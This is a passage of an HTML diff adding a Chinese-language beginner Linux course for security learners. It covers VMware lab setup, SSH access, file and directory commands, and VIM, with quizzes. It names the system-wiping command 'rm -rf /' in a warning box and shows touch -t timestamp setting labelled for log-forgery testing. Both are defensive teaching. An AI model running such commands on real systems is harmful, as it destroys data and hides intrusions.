+                <td>被滲透的對象</td>
+                <td>CentOS/Ubuntu Web 伺服器、資料庫伺服器</td>
+              </tr>
+              <tr>
+                <td>應急響應</td>
+                <td>事件分析平台</td>
+                <td>日誌分析、進程排查、惡意文件分析</td>
+              </tr>
+              <tr>
+                <td>靶場搭建</td>
+                <td>實驗環境</td>
+                <td>用 Docker 在 Linux 上快速部署 Vulhub 漏洞環境</td>
+              </tr>
+              <tr>
+                <td>安全開發</td>
+                <td>開發與部署環境</td>
+                <td>Python 安全腳本、自動化工具的運行環境</td>
+              </tr>
+            </tbody>
+          </table>
+        </div>
+
+        <div class="callout tip">
+          <div class="callout-label">學習重點</div>
+          <p>本階段的目標不是成為 Linux 系統管理員，而是掌握資安工作中每天會用到的 Linux 操作技能：文件操作、權限管理、日誌分析、進程查看、網路配置和腳本基礎。</p>
+        </div>
+
+        <h2>Linux vs Windows：資安視角比較</h2>
+        <div class="table-wrap">
+          <table class="dt">
+            <thead><tr><th>特性</th><th>Linux</th><th>Windows</th></tr></thead>
+            <tbody>
+              <tr><td>文件系統</td><td>一切皆文件（EXT4/XFS）</td><td>NTFS，磁碟分槽（C:/D:/）</td></tr>
+              <tr><td>用戶權限</td><td>root（超級管理員）+ 普通用戶</td><td>Administrator + 一般用戶</td></tr>
+              <tr><td>日誌位置</td><td>/var/log/ 目錄下</td><td>事件查看器（Event Viewer）</td></tr>
+              <tr><td>防火牆</td><td>iptables / firewalld / ufw</td><td>Windows Defender Firewall</td></tr>
+              <tr><td>遠端管理</td><td>SSH（加密，22 端口）</td><td>RDP（3389 端口）、WinRM</td></tr>
+              <tr><td>主要攻擊面</td><td>Web 服務漏洞、提權漏洞、錯誤配置</td><td>SMB 漏洞、RDP 漏洞、宏病毒</td></tr>
+            </tbody>
+          </table>
+        </div>
+
+        <div class="quiz">
+          <div class="quiz-badge">小測驗</div>
+          <div class="quiz-q">在 Linux 系統中，擁有最高權限的用戶帳號名稱是什麼？</div>
+          <div class="quiz-opts">
+            <div class="quiz-opt" onclick="checkQ(this,false)"><span class="quiz-opt-key">A</span>admin</div>
+            <div class="quiz-opt" onclick="checkQ(this,false)"><span class="quiz-opt-key">B</span>superuser</div>
+            <div class="quiz-opt" onclick="checkQ(this,true)"><span class="quiz-opt-key">C</span>root</div>
+            <div class="quiz-opt" onclick="checkQ(this,false)"><span class="quiz-opt-key">D</span>administrator</div>
+          </div>
+          <div class="quiz-exp">正確！Linux 的超級管理員帳號固定為 <code>root</code>，其 UID（User ID）為 0。root 可以執行任何操作，包括修改系統文件、刪除所有資料、安裝軟體等。在滲透測試中，提升到 root 權限（Root Privilege Escalation）是最終目標之一。在日常操作中，應避免直接使用 root，改用 <code>sudo</code> 執行需要特權的命令。</div>
+        </div>
+      </div>
+
+      <!-- ============================================================ -->
+      <!-- L1-2  VMware + Linux 安裝 -->
+      <!-- ============================================================ -->
+      <div class="content-block" id="l1-2">
+        <h2>VMware 安裝與 Linux 系統安裝</h2>
+        <p>在正式學習 Linux 之前，需要先搭建實驗環境。推薦使用 VMware Workstation 建立虛擬機，這樣可以在不影響宿主機的情況下自由實驗，犯錯也可以恢復快照。</p>
+
+        <h3>為什麼選擇虛擬機？</h3>
+        <div class="terms-grid">
+          <div class="term-card">
+            <div class="term-name">快照 (Snapshot)</div>
+            <div class="term-def">保存當前虛擬機的完整狀態，出錯後可以一鍵還原到之前的狀態。這在學習和實驗時非常安全。</div>
+          </div>
+          <div class="term-card">
+            <div class="term-name">隔離性</div>
+            <div class="term-def">虛擬機在沙箱環境中運行，即使虛擬機系統被攻陷或出錯，宿主機也不受影響。滲透測試靶機必須用虛擬機。</div>
+          </div>
+          <div class="term-card">
+            <div class="term-name">網路模擬</div>
+            <div class="term-def">VMware 可以模擬複雜的網路拓撲（NAT、橋接、僅主機），方便搭建攻防實驗環境。</div>
+          </div>
+          <div class="term-card">
+            <div class="term-name">克隆 (Clone)</div>
+            <div class="term-def">從一個配置好的虛擬機快速複製出多台，節省重複安裝的時間。搭建多機攻防環境時非常有用。</div>
+          </div>
+        </div>
+
+        <h3>安裝步驟概覽</h3>
+        <div class="table-wrap">
+          <table class="dt">
+            <thead><tr><th>#</th><th>步驟</th><th>說明</th><th>建議配置</th></tr></thead>
+            <tbody>
+              <tr><td class="mono">01</td><td>下載 VMware Workstation Pro</td><td>官網下載，2024年已對個人免費</td><td>版本 17+</td></tr>
+              <tr><td class="mono">02</td><td>下載 CentOS 7 ISO 映像</td><td>mirrors.aliyun.com 或 mirrors.tuna.tsinghua.edu.cn</td><td>CentOS-7-x86_64-Minimal</td></tr>
+              <tr><td class="mono">03</td><td>新建虛擬機</td><td>選擇「自定義」，設定 CPU/記憶體/磁碟</td><td>2核心/2GB RAM/50GB 磁碟</td></tr>
+              <tr><td class="mono">04</td><td>安裝 CentOS 7</td><td>選擇語言、磁碟分區、設定 root 密碼</td><td>最小化安裝即可</td></tr>
+              <tr><td class="mono">05</td><td>安裝 VMware Tools</td><td>讓虛擬機支持全螢幕、共享剪貼板</td><td>必裝</td></tr>
+              <tr><td class="mono">06</td><td>創建快照</td><td>安裝完成後立即建立「乾淨狀態」快照</td><td>強烈建議</td></tr>
+            </tbody>
+          </table>
+        </div>
+
+        <h3>VMware 網路模式選擇</h3>
+        <div class="table-wrap">
+          <table class="dt">
+            <thead><tr><th>模式</th><th>虛擬機能訪問宿主機</th><th>虛擬機能訪問外網</th><th>外網能訪問虛擬機</th><th>適用場景</th></tr></thead>
+            <tbody>
+              <tr><td class="mono">橋接 (Bridge)</td><td>可以</td><td>可以</td><td>可以</td><td>需要虛擬機對外提供服務、攻防演練</td></tr>
+              <tr><td class="mono">NAT</td><td>可以</td><td>可以</td><td>不可以</td><td>日常學習推薦，虛擬機訪問外網但受保護</td></tr>
+              <tr><td class="mono">僅主機 (Host-Only)</td><td>可以</td><td>不可以</td><td>不可以</td><td>隔離環境，如勒索病毒分析靶機</td></tr>
+            </tbody>
+          </table>
+        </div>
+
+        <div class="callout warn">
+          <div class="callout-label">注意事項</div>
+          <p>在分析惡意軟體、搭建漏洞靶機時，務必將虛擬機網路設為「僅主機模式」，防止惡意程式透過虛擬機感染宿主機或外部網路。</p>
+        </div>
+
+        <div class="quiz">
+          <div class="quiz-badge">小測驗</div>
+          <div class="quiz-q">你要在虛擬機上搭建一個存在嚴重漏洞的 Web 應用靶機進行練習，應該選擇哪種 VMware 網路模式最安全？</div>
+          <div class="quiz-opts">
+            <div class="quiz-opt" onclick="checkQ(this,false)"><span class="quiz-opt-key">A</span>橋接模式，方便從任意設備訪問靶機</div>
+            <div class="quiz-opt" onclick="checkQ(this,false)"><span class="quiz-opt-key">B</span>NAT 模式，虛擬機可以上網更新靶機</div>
+            <div class="quiz-opt" onclick="checkQ(this,true)"><span class="quiz-opt-key">C</span>僅主機模式，完全隔離防止漏洞被外部利用</div>
+            <div class="quiz-opt" onclick="checkQ(this,false)"><span class="quiz-opt-key">D</span>不需要考慮網路模式，靶機不重要</div>
+          </div>
+          <div class="quiz-exp">正確！搭建漏洞靶機時應使用「僅主機模式」。橋接模式下，漏洞可能被同一局域網的其他設備利用；NAT 模式雖較安全但靶機仍可向外發起連接。僅主機模式完全隔離了外部網路，只允許宿主機與虛擬機之間通信，是最安全的選擇。</div>
+        </div>
+      </div>
+
+      <!-- ============================================================ -->
+      <!-- L1-3  VMware 網路配置與 Xshell 連線 -->
+      <!-- ============================================================ -->
+      <div class="content-block" id="l1-3">
+        <h2>VMware 網路配置與 Xshell 遠端連線</h2>
+        <p>安裝好虛擬機後，通常我們不會直接在 VMware 窗口操作，而是透過 Xshell 等 SSH 客戶端進行遠端連線，因為這樣可以方便地複製貼上命令、開多個標籤頁。</p>
+
+        <h3>第一步：查詢虛擬機 IP 地址</h3>
+        <div class="terminal">
+          <div class="terminal-bar">
+            <div class="terminal-dots"><span class="td1"></span><span class="td2"></span><span class="td3"></span></div>
+            <span class="terminal-title">CentOS 7 Terminal</span>
+            <button class="terminal-copy" onclick="copyTerm(this)">複製</button>
+          </div>
+          <div class="terminal-body">
+<span class="comment"># 查看網路介面 IP 地址（CentOS 7）</span>
+<span class="prompt">[root@localhost ~]#</span> <span class="cmd">ip</span> <span class="flag">addr</span>
+<span class="out">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536
+    inet 127.0.0.1/8 scope host lo</span>
+<span class="out">2: ens33: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500</span>
+<span class="highlight-out">    inet 192.168.10.128/24 brd 192.168.10.255 scope global ens33</span>
+
+<span class="comment"># 或使用舊版命令</span>
+<span class="prompt">[root@localhost ~]#</span> <span class="cmd">ifconfig</span>
+<span class="comment"># 若提示 command not found，請先安裝：yum install net-tools -y</span>
+
+<span class="comment"># 測試網路連通性</span>
+<span class="prompt">[root@localhost ~]#</span> <span class="cmd">ping</span> <span class="flag">-c 4</span> <span class="path">8.8.8.8</span>
+</div>
+        </div>
+
+        <h3>第二步：確保 SSH 服務啟動</h3>
+        <div class="terminal">
+          <div class="terminal-bar">
+            <div class="terminal-dots"><span class="td1"></span><span class="td2"></span><span class="td3"></span></div>
+            <span class="terminal-title">CentOS 7 — SSH 服務管理</span>
+            <button class="terminal-copy" onclick="copyTerm(this)">複製</button>
+          </div>
+          <div class="terminal-body">
+<span class="comment"># 查看 SSH 服務狀態</span>
+<span class="prompt">[root@localhost ~]#</span> <span class="cmd">systemctl</span> <span class="flag">status</span> sshd
+<span class="ok">● sshd.service - OpenSSH server daemon</span>
+<span class="out">   Loaded: loaded (/usr/lib/systemd/system/sshd.service)</span>
+<span class="ok">   Active: active (running) since Mon 2025-01-01 10:00:00</span>
+
+<span class="comment"># 若未啟動，執行以下命令</span>
+<span class="prompt">[root@localhost ~]#</span> <span class="cmd">systemctl</span> <span class="flag">start</span> sshd
+
+<span class="comment"># 設定開機自動啟動</span>
+<span class="prompt">[root@localhost ~]#</span> <span class="cmd">systemctl</span> <span class="flag">enable</span> sshd
+
+<span class="comment"># 確認 22 端口正在監聽</span>
+<span class="prompt">[root@localhost ~]#</span> <span class="cmd">ss</span> <span class="flag">-tlnp</span> | <span class="cmd">grep</span> <span class="flag">22</span>
+<span class="out">LISTEN  0  128  0.0.0.0:22  0.0.0.0:*  users:(("sshd",pid=1234))</span>
+</div>
+        </div>
+
+        <h3>Xshell 連線設定</h3>
+        <div class="table-wrap">
+          <table class="dt">
+            <thead><tr><th>設定項目</th><th>值</th></tr></thead>
+            <tbody>
+              <tr><td>連線名稱</td><td>CentOS-Lab（自定義）</td></tr>
+              <tr><td>協議</td><td><strong>SSH</strong>（不要選 Telnet！）</td></tr>
+              <tr><td>主機 IP</td><td>虛擬機的 IP（如 192.168.10.128）</td></tr>
+              <tr><td>端口</td><td>22</td></tr>
+              <tr><td>用戶名</td><td>root</td></tr>
+              <tr><td>認證方式</td><td>Password（輸入安裝時設定的密碼）</td></tr>
+            </tbody>
+          </table>
+        </div>
+
+        <div class="callout info">
+          <div class="callout-label">資安實踐</div>
+          <p>在真實的生產環境中，應禁止 root 直接 SSH 登入（在 /etc/ssh/sshd_config 設定 <code>PermitRootLogin no</code>），並改用 SSH 金鑰認證而非密碼認證，同時修改默認的 22 端口。這些配置可以大幅降低暴力破解的風險。但在學習環境中，暫時使用 root 和密碼登入即可。</p>
+        </div>
+      </div>
+
+      <!-- ============================================================ -->
+      <!-- L1-4  pwd / cd / tree / mkdir -->
+      <!-- ============================================================ -->
+      <div class="content-block" id="l1-4">
+        <h2>目錄導航：pwd / cd / tree / mkdir</h2>
+        <p>Linux 的一切都是文件，包括目錄（目錄也是一種特殊的文件）。掌握目錄導航命令是使用 Linux 的第一步。</p>
+
+        <div class="cmd-grid">
+          <div class="cmd-card">
+            <div class="cmd-name">pwd</div>
+            <div class="cmd-syntax">pwd</div>
+            <div class="cmd-desc">Print Working Directory，顯示當前所在的完整絕對路徑。迷路時最有用的命令。</div>
+          </div>
+          <div class="cmd-card">
+            <div class="cmd-name">cd</div>
+            <div class="cmd-syntax">cd [目錄路徑]</div>
+            <div class="cmd-desc">Change Directory，切換工作目錄。<code>cd ~</code> 回 home 目錄，<code>cd -</code> 回上次的目錄，<code>cd ..</code> 回上一層。</div>
+          </div>
+          <div class="cmd-card">
+            <div class="cmd-name">tree</div>
+            <div class="cmd-syntax">tree [選項] [目錄]</div>
+            <div class="cmd-desc">以樹狀結構顯示目錄內容。<code>tree -L 2</code> 只顯示 2 層深度，<code>tree -a</code> 顯示隱藏文件。需安裝：<code>yum install tree</code>。</div>
+          </div>
+          <div class="cmd-card">
+            <div class="cmd-name">mkdir</div>
+            <div class="cmd-syntax">mkdir [選項] 目錄名</div>
+            <div class="cmd-desc">Make Directory，創建目錄。<code>mkdir -p a/b/c</code> 可遞迴創建多層目錄，<code>mkdir -m 755 dir</code> 同時設定權限。</div>
+          </div>
+        </div>
+
+        <div class="terminal">
+          <div class="terminal-bar">
+            <div class="terminal-dots"><span class="td1"></span><span class="td2"></span><span class="td3"></span></div>
+            <span class="terminal-title">實戰演練 — 目錄導航</span>
+            <button class="terminal-copy" onclick="copyTerm(this)">複製</button>
+          </div>
+          <div class="terminal-body">
+<span class="comment"># 查看當前位置</span>
+<span class="prompt">[root@localhost ~]#</span> <span class="cmd">pwd</span>
+<span class="out">/root</span>
+
+<span class="comment"># 切換到 /tmp 目錄</span>
+<span class="prompt">[root@localhost ~]#</span> <span class="cmd">cd</span> <span class="path">/tmp</span>
+<span class="prompt">[root@localhost tmp]#</span> <span class="cmd">pwd</span>
+<span class="out">/tmp</span>
+
+<span class="comment"># 創建多層目錄結構</span>
+<span class="prompt">[root@localhost tmp]#</span> <span class="cmd">mkdir</span> <span class="flag">-p</span> <span class="path">project/src/main</span>
+
+<span class="comment"># 查看目錄樹狀結構</span>
+<span class="prompt">[root@localhost tmp]#</span> <span class="cmd">tree</span> <span class="path">project</span>
+<span class="out">project
+└── src
+    └── main
+
+2 directories, 0 files</span>
+
+<span class="comment"># 使用 ~ 快速回到 root 的 home 目錄</span>
+<span class="prompt">[root@localhost tmp]#</span> <span class="cmd">cd</span> <span class="flag">~</span>
+<span class="prompt">[root@localhost ~]#</span> <span class="cmd">pwd</span>
+<span class="out">/root</span>
+
+<span class="comment"># cd - 回到剛才去過的目錄</span>
+<span class="prompt">[root@localhost ~]#</span> <span class="cmd">cd</span> <span class="flag">-</span>
+<span class="out">/tmp</span>
+</div>
+        </div>
+
+        <div class="callout tip">
+          <div class="callout-label">Shell 技巧</div>
+          <p><strong>Tab 自動補全</strong>是 Linux 命令行最重要的技巧！輸入命令或路徑的前幾個字母，按 Tab 鍵自動補全，按兩次 Tab 列出所有可能的選項。這不僅節省時間，還能避免打錯字。<br><strong>方向鍵上下</strong>瀏覽命令歷史，<code>history</code> 查看所有歷史命令，<code>Ctrl+R</code> 反向搜尋歷史。</p>
+        </div>
+      </div>
+
+      <!-- ============================================================ -->
+      <!-- L2-1  touch / ls -->
+      <!-- ============================================================ -->
+      <div class="content-block" id="l2-1">
+        <h2>touch / ls — 創建文件與列出目錄</h2>
+
+        <h3>ls 命令詳解（最常用命令之一）</h3>
+        <div class="cmd-grid">
+          <div class="cmd-card">
+            <div class="cmd-name">ls</div>
+            <div class="cmd-syntax">ls [選項] [路徑]</div>
+            <div class="cmd-desc">列出目錄內容。不帶選項只顯示文件名。</div>
+          </div>
+          <div class="cmd-card">
+            <div class="cmd-name">ls -l</div>
+            <div class="cmd-syntax">ls -l 或 ll</div>
+            <div class="cmd-desc">長格式顯示，包含權限、所有者、大小、修改時間等詳細信息。<code>ll</code> 是 <code>ls -l</code> 的別名。</div>
+          </div>
+          <div class="cmd-card">
+            <div class="cmd-name">ls -a</div>
+            <div class="cmd-syntax">ls -a</div>
+            <div class="cmd-desc">顯示所有文件，包括以 <code>.</code> 開頭的隱藏文件（如 .bashrc、.ssh/）。</div>
+          </div>
+          <div class="cmd-card">
+            <div class="cmd-name">ls -lh</div>
+            <div class="cmd-syntax">ls -lh</div>
+            <div class="cmd-desc">長格式 + 人類可讀大小（KB/MB/GB），比 ls -l 更容易看懂文件大小。</div>
+          </div>
+        </div>
+
+        <div class="terminal">
+          <div class="terminal-bar">
+            <div class="terminal-dots"><span class="td1"></span><span class="td2"></span><span class="td3"></span></div>
+            <span class="terminal-title">ls 輸出解讀</span>
+            <button class="terminal-copy" onclick="copyTerm(this)">複製</button>
+          </div>
+          <div class="terminal-body">
+<span class="prompt">[root@localhost ~]#</span> <span class="cmd">ls</span> <span class="flag">-lah</span>
+<span class="out">total 48K</span>
+<span class="highlight-out">drwxr-x---  3 root root 4.0K Jan  1 10:00 .</span>
+<span class="out">drwxr-xr-x 18 root root 4.0K Jan  1 09:00 ..</span>
+<span class="out">-rw-------  1 root root 3.1K Jan  1 10:00 .bash_history</span>
+<span class="out">-rw-r--r--  1 root root  176 Jan  1 09:00 .bash_profile</span>
+<span class="out">-rw-r--r--  1 root root  124 Jan  1 09:00 .bashrc</span>
+<span class="out">-rw-r--r--  1 root root 1.2K Jan  1 10:00 notes.txt</span>
+
+<span class="comment">
+# 解讀第一列（權限字串）：drwxr-x---
+# d     = 目錄 (directory)
+# rwx   = 擁有者 (Owner)   可讀/可寫/可執行
+# r-x   = 群組 (Group)     可讀/不可寫/可執行
+# ---   = 其他人 (Others)  不可讀/不可寫/不可執行
+</span>
+
+<span class="comment"># touch：創建空文件，或更新文件時間戳</span>
+<span class="prompt">[root@localhost ~]#</span> <span class="cmd">touch</span> <span class="path">test.txt</span>
+<span class="prompt">[root@localhost ~]#</span> <span class="cmd">touch</span> <span class="path">file1.txt file2.txt file3.txt</span>
+<span class="comment"># 同時創建多個文件</span>
+
+<span class="comment"># 創建一週前時間戳的文件（用於日誌偽造測試）</span>
+<span class="prompt">[root@localhost ~]#</span> <span class="cmd">touch</span> <span class="flag">-t</span> 202401010000 <span class="path">old_file.txt</span>
+</div>
+        </div>
+
+        <div class="callout info">
+          <div class="callout-label">應急響應知識點</div>
+          <p>在進行 Linux 入侵排查時，<code>ls -la --full-time /tmp</code>、<code>ls -la /var/www/html</code> 等命令可以快速找到近期被創建或修改的可疑文件。攻擊者入侵後常在 /tmp 目錄放置 Webshell 或惡意腳本，因為 /tmp 對所有用戶可寫。</p>
+        </div>
+      </div>
+
+      <!-- ============================================================ -->
+      <!-- L2-2  cp -->
+      <!-- ============================================================ -->
+      <div class="content-block" id="l2-2">
+        <h2>cp — 複製文件與目錄</h2>
+        <p><code>cp</code>（copy）命令用於複製文件或目錄，是日常操作和備份中最常用的命令之一。</p>
+
+        <div class="terminal">
+          <div class="terminal-bar">
+            <div class="terminal-dots"><span class="td1"></span><span class="td2"></span><span class="td3"></span></div>
+            <span class="terminal-title">cp 命令使用範例</span>
+            <button class="terminal-copy" onclick="copyTerm(this)">複製</button>
+          </div>
+          <div class="terminal-body">
+<span class="comment"># 基本複製（文件到文件）</span>
+<span class="prompt">[root@localhost ~]#</span> <span class="cmd">cp</span> <span class="path">source.txt destination.txt</span>
+
+<span class="comment"># 複製文件到目錄</span>
+<span class="prompt">[root@localhost ~]#</span> <span class="cmd">cp</span> <span class="path">notes.txt /tmp/</span>
+
+<span class="comment"># 遞迴複製整個目錄（-r 或 -R）</span>
+<span class="prompt">[root@localhost ~]#</span> <span class="cmd">cp</span> <span class="flag">-r</span> <span class="path">/etc/nginx /tmp/nginx_backup</span>
+
+<span class="comment"># 複製並保留原始文件屬性（時間戳、權限、所有者）</span>
+<span class="prompt">[root@localhost ~]#</span> <span class="cmd">cp</span> <span class="flag">-p</span> <span class="path">important.conf /backup/</span>
+
+<span class="comment"># 複製前詢問是否覆蓋（-i = interactive）</span>
+<span class="prompt">[root@localhost ~]#</span> <span class="cmd">cp</span> <span class="flag">-i</span> <span class="path">file.txt /tmp/</span>
+<span class="out">cp: overwrite '/tmp/file.txt'? y</span>
+
+<span class="comment"># 常用組合：-rp 遞迴且保留屬性，備份常用</span>
+<span class="prompt">[root@localhost ~]#</span> <span class="cmd">cp</span> <span class="flag">-rp</span> <span class="path">/var/www/html /var/www/html_backup_20250101</span>
+</div>
+        </div>
+
+        <div class="callout tip">
+          <div class="callout-label">實戰應用：修改前先備份</div>
+          <p>在修改任何重要的配置文件（如 /etc/ssh/sshd_config、/etc/nginx/nginx.conf）之前，<strong>務必先備份</strong>：<code>cp /etc/ssh/sshd_config /etc/ssh/sshd_config.bak</code>。這是一個非常好的習慣，出錯時可以快速恢復。</p>
+        </div>
+      </div>
+
+      <!-- ============================================================ -->
+      <!-- L2-3  rm / mv -->
+      <!-- ============================================================ -->
+      <div class="content-block" id="l2-3">
+        <h2>rm 刪除 / mv 移動與重命名</h2>
+
+        <div class="callout danger">
+          <div class="callout-label">極度危險</div>
+          <p>Linux 的 <code>rm</code> 命令沒有回收站！刪除後資料直接消失，幾乎無法恢復。特別是 <code>rm -rf /</code> 這個命令（刪除根目錄下所有文件）是毀滅性的，絕對不能執行。<strong>操作前請三思，確認路徑無誤再按 Enter。</strong></p>
+        </div>
+
+        <div class="terminal">
+          <div class="terminal-bar">
+            <div class="terminal-dots"><span class="td1"></span><span class="td2"></span><span class="td3"></span></div>
+            <span class="terminal-title">rm / mv 命令使用範例</span>
+            <button class="terminal-copy" onclick="copyTerm(this)">複製</button>
+          </div>
+          <div class="terminal-body">
+<span class="comment">===== rm 刪除命令 =====</span>
+
+<span class="comment"># 刪除單個文件</span>
+<span class="prompt">[root@localhost ~]#</span> <span class="cmd">rm</span> <span class="path">test.txt</span>
+
+<span class="comment"># 刪除前詢問確認（推薦）</span>
+<span class="prompt">[root@localhost ~]#</span> <span class="cmd">rm</span> <span class="flag">-i</span> <span class="path">important.txt</span>
+<span class="out">rm: remove regular file 'important.txt'? y</span>
+
+<span class="comment"># 強制刪除不詢問（小心！）</span>
+<span class="prompt">[root@localhost ~]#</span> <span class="cmd">rm</span> <span class="flag">-f</span> <span class="path">file.txt</span>
+
+<span class="comment"># 遞迴刪除整個目錄（危險！確保路徑正確）</span>
+<span class="prompt">[root@localhost ~]#</span> <span class="cmd">rm</span> <span class="flag">-rf</span> <span class="path">/tmp/test_dir</span>
+
+<span class="comment">===== mv 移動/重命名命令 =====</span>
+
+<span class="comment"># 重命名文件</span>
+<span class="prompt">[root@localhost ~]#</span> <span class="cmd">mv</span> <span class="path">old_name.txt new_name.txt</span>
+
+<span class="comment"># 移動文件到其他目錄</span>
+<span class="prompt">[root@localhost ~]#</span> <span class="cmd">mv</span> <span class="path">notes.txt /tmp/</span>
+
+<span class="comment"># 移動整個目錄</span>
+<span class="prompt">[root@localhost ~]#</span> <span class="cmd">mv</span> <span class="path">/tmp/old_dir /var/www/new_dir</span>
+
+<span class="comment"># 移動前詢問是否覆蓋</span>
+<span class="prompt">[root@localhost ~]#</span> <span class="cmd">mv</span> <span class="flag">-i</span> <span class="path">file.txt /tmp/</span>
+</div>
+        </div>
+
+        <div class="quiz">
+          <div class="quiz-badge">小測驗</div>
+          <div class="quiz-q">以下哪個命令可以將 /home/user/documents 目錄下的所有文件複製到 /backup/ 目錄，並保留原始文件的時間戳和權限？</div>
+          <div class="quiz-opts">
+            <div class="quiz-opt" onclick="checkQ(this,false)"><span class="quiz-opt-key">A</span><code>cp /home/user/documents /backup/</code></div>
+            <div class="quiz-opt" onclick="checkQ(this,true)"><span class="quiz-opt-key">B</span><code>cp -rp /home/user/documents /backup/</code></div>
+            <div class="quiz-opt" onclick="checkQ(this,false)"><span class="quiz-opt-key">C</span><code>mv /home/user/documents /backup/</code></div>
+            <div class="quiz-opt" onclick="checkQ(this,false)"><span class="quiz-opt-key">D</span><code>cp -f /home/user/documents /backup/</code></div>
+          </div>
+          <div class="quiz-exp">正確！<code>-r</code> (recursive) 讓 cp 遞迴複製整個目錄，<code>-p</code> (preserve) 保留文件的時間戳、權限和所有者。選項 A 沒有 -r 無法複製目錄，選項 C 是移動（原始資料會消失），選項 D 的 -f 是強制覆蓋目標但不保留屬性。</div>
+        </div>
+      </div>
+
+      <!-- ============================================================ -->
+      <!-- L3-1  VIM 介紹 -->
+      <!-- ============================================================ -->
+      <div class="content-block" id="l3-1">
+        <h2>VIM 編輯器介紹</h2>
+        <p>VIM（Vi IMproved）是 Linux 上最重要的文字編輯器，也是讓初學者最頭疼的程式之一。但一旦掌握，效率極高，而且在沒有圖形介面的伺服器環境中，VIM 幾乎是唯一的選擇。</p>
+        <p>VIM 的核心設計理念是：<strong>手不離鍵盤</strong>，透過不同模式和快捷鍵完成所有編輯操作，無需觸碰滑鼠。</p>
+
+        <div class="callout warn">
+          <div class="callout-label">初學者常見問題</div>
+          <p>「我打開了 VIM 但不知道怎麼退出！」— 這幾乎是所有 Linux 新手的第一個問題。記住：<strong>按 Esc 確保回到普通模式，然後輸入 :q! 強制退出（不儲存），或 :wq 儲存後退出。</strong></p>
+        </div>
+
+        <h3>VIM 的三大模式</h3>
+        <div class="terms-grid">
+          <div class="term-card">
+            <div class="term-name">普通模式 (Normal Mode)</div>
+            <div class="term-def">VIM 啟動後默認進入此模式。此模式下輸入的字母都是命令，不能直接輸入文字。按 <code>Esc</code> 從任何模式回到此模式。</div>
+          </div>
+          <div class="term-card">
+            <div class="term-name">插入模式 (Insert Mode)</div>
+            <div class="term-def">類似一般的文字編輯器，可以直接輸入和修改文字。按 <code>i</code>（在游標前插入）、<code>a</code>（在游標後插入）、<code>o</code>（在下方新增一行）進入。</div>
+          </div>
+          <div class="term-card">
+            <div class="term-name">命令行模式 (Command Mode)</div>
+            <div class="term-def">在普通模式下按 <code>:</code> 進入，可以執行儲存、退出、搜尋替換等命令。如 <code>:w</code> 儲存、<code>:q</code> 退出、<code>:set nu</code> 顯示行號。</div>
+          </div>
+          <div class="term-card">
+            <div class="term-name">可視模式 (Visual Mode)</div>
+            <div class="term-def">在普通模式下按 <code>v</code> 進入，可以選取文字塊進行複製、刪除等操作。<code>V</code> 是行選取，<code>Ctrl+V</code> 是列選取。</div>
+          </div>
+        </div>
+      </div>
+
+      <!-- ============================================================ -->
+      <!-- L3-2  VIM 三大模式 -->
+      <!-- ============================================================ -->
+      <div class="content-block" id="l3-2">
+        <h2>VIM 基本操作實戰</h2>
+        <div class="terminal">
+          <div class="terminal-bar">
+            <div class="terminal-dots"><span class="td1"></span><span class="td2"></span><span class="td3"></span></div>
+            <span class="terminal-title">VIM 完整操作流程</span>
+            <button class="terminal-copy" onclick="copyTerm(this)">複製</button>
+          </div>
+          <div class="terminal-body">
+<span class="comment"># 1. 開啟/創建文件</span>
+<span class="prompt">[root@localhost ~]#</span> <span class="cmd">vim</span> <span class="path">test.conf</span>
+
+<span class="comment"># 進入 VIM 後的操作（在 VIM 內部）：
+
+# === 進入插入模式 ===
+i    → 在游標位置之前插入
+a    → 在游標位置之後插入
+o    → 在當前行下方新增一行並進入插入模式
+I    → 移到行首並進入插入模式
+A    → 移到行尾並進入插入模式
+O    → 在當前行上方新增一行
+
+# === 回到普通模式 ===
+Esc  → 從任何模式回到普通模式
+
+# === 儲存與退出（命令行模式）===
+:w        → 儲存（Write）
+:q        → 退出（Quit，前提是無未儲存修改）
+:wq       → 儲存並退出（最常用！）
+:q!       → 強制退出，不儲存任何修改
+:wq!      → 強制儲存並退出（唯讀文件時使用）
+:x        → 等同 :wq（有修改時才寫入）
+
+# === 在命令行模式下的實用命令 ===
+:set nu        → 顯示行號
+:set nonu      → 關閉行號
+:set paste     → 貼上模式（避免自動縮排）
+:/keyword      → 向下搜尋 keyword
+:?keyword      → 向上搜尋 keyword
+:s/old/new/g   → 在當前行替換 old 為 new
+:%s/old/new/g  → 全文替換</span>
+</div>
+        </div>
+
+        <div class="callout tip">
+          <div class="callout-label">資安實戰：修改 SSH 配置</div>
+          <p>在加固伺服器時，你會頻繁用 VIM 修改配置文件：<br>
+          <code>vim /etc/ssh/sshd_config</code><br>
+          找到 <code>PermitRootLogin yes</code>，改為 <code>PermitRootLogin no</code>，<br>
+          儲存後重啟 SSH：<code>systemctl restart sshd</code>。<br>
+          這一步驟可以防止攻擊者直接暴力破解 root 帳號的 SSH 登入。</p>
+        </div>
+      </div>
+
+      <!-- ============================================================ -->
+      <!-- L3-3  VIM 快捷鍵 -->
+      <!-- ============================================================ -->
+      <div class="content-block" id="l3-3">
+        <h2>VIM 快捷鍵大全</h2>
+        <p>熟練的 VIM 使用者速度可以超越任何其他編輯器。以下是在普通模式下最常用的快捷鍵：</p>
+
+        <div class="table-wrap">
+          <table class="dt">
+            <thead><tr><th>類別</th><th>快捷鍵</th><th>功能</th></tr></thead>
+            <tbody>
+              <tr><td rowspan="6"><strong>游標移動</strong></td><td class="mono">h j k l</td><td>左 下 上 右（替代方向鍵）</td></tr>
+              <tr><td class="mono">0 / $</td><td>移到行首 / 行尾</td></tr>
+              <tr><td class="mono">gg / G</td><td>移到文件最頂部 / 最底部</td></tr>
+              <tr><td class="mono">:數字</td><td>跳到指定行號（如 :50 跳到第50行）</td></tr>
+              <tr><td class="mono">w / b</td><td>向前跳一個單詞 / 向後跳一個單詞</td></tr>
+              <tr><td class="mono">Ctrl+F / Ctrl+B</td><td>向下翻頁 / 向上翻頁</td></tr>
+              <tr><td rowspan="5"><strong>刪除</strong></td><td class="mono">x</td><td>刪除游標所在字元</td></tr>
+              <tr><td class="mono">dd</td><td>刪除整行（剪切到暫存區）</td></tr>
+              <tr><td class="mono">5dd</td><td>刪除游標下 5 行</td></tr>
+              <tr><td class="mono">dw</td><td>刪除游標到詞尾</td></tr>
+              <tr><td class="mono">d$</td><td>刪除游標到行尾</td></tr>
+              <tr><td rowspan="3"><strong>複製貼上</strong></td><td class="mono">yy</td><td>複製整行（yank）</td></tr>
